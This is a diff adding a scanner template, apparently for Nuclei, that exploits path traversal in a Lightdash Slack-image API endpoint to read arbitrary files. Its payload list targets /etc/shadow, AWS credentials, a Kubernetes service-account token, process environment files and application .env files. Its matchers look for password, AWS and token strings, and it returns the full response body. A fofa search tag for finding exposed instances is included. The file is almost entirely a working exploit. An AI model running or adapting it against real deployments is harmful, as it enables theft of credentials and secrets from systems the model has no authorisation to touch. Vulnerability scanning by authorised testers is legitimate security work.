@@ -1,0 +1,62 @@
+id: lightdsah-file-read
+
+info:
+  name: lightdash api file read
+  severity: high
+  description: |
+    lightdash has an api endpoint to read slack image but it can abused to read arbitray file
+  author: Esonhugh-self-maintained
+  metadata:
+    fofa: "lightdash"
+  tags: lfi,file-read,lightdash,api
+
+http:
+  - path:
+      - "{{ BaseURL }}/api/v1/slack/image/slack-image{{ url_encode(concat('/../../../../..', file)) }}"
+
+    payloads:
+      file:
+        - "/etc/passwd"
+        - "/etc/shadow"
+        - "%2Fetc%2Fpasswd"
+        - "/root/.aws/credentials"
+        - "/var/run/secrets/kubernetes.io/serviceaccount/token"
+        - "/proc/1/environ"
+        - "/proc/80/environ"
+        - "/proc/81/environ"
+        - "/proc/82/environ"
+        - "/proc/83/environ"
+        - "/proc/self/environ"
+        - "/usr/app/.devcontainer/devcontainer.json"
+        - "/usr/app/.env"
+        - "/usr/app/.env.local"
+        - "/usr/app/.env.prodction"
+        - "/usr/app/.env.prodction.local"
+        - "/usr/app/.env.test.local"
+        - "/usr/app/credentials.json"
+        - "/usr/app/lightdash.yml"
+        - "/usr/app/lightdash_dev.yml"
+        - "/usr/app/docker-compose.yml"
+
+    extractors:
+      - type: dsl
+        dsl:
+          - body
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        condition: or
+        words:
+          - "root:x:"
+          - "PATH="
+          - "verion:"
+          - "LIGHTDASH"
+          - "PASS"
+          - "AWS"
+          - "eyJhb"
+# digest: 4a0a00473045022100f7fb42f4efb75caf72478786e834236c26f80cd73ff6d43e1eebda8bfd21d21e02201aaa06db65bb82c1659dedb878955e68b167e479d5b0f04b5eb2b769db3b983f:569246fd1e83ae0648e1a21ffb4fe811
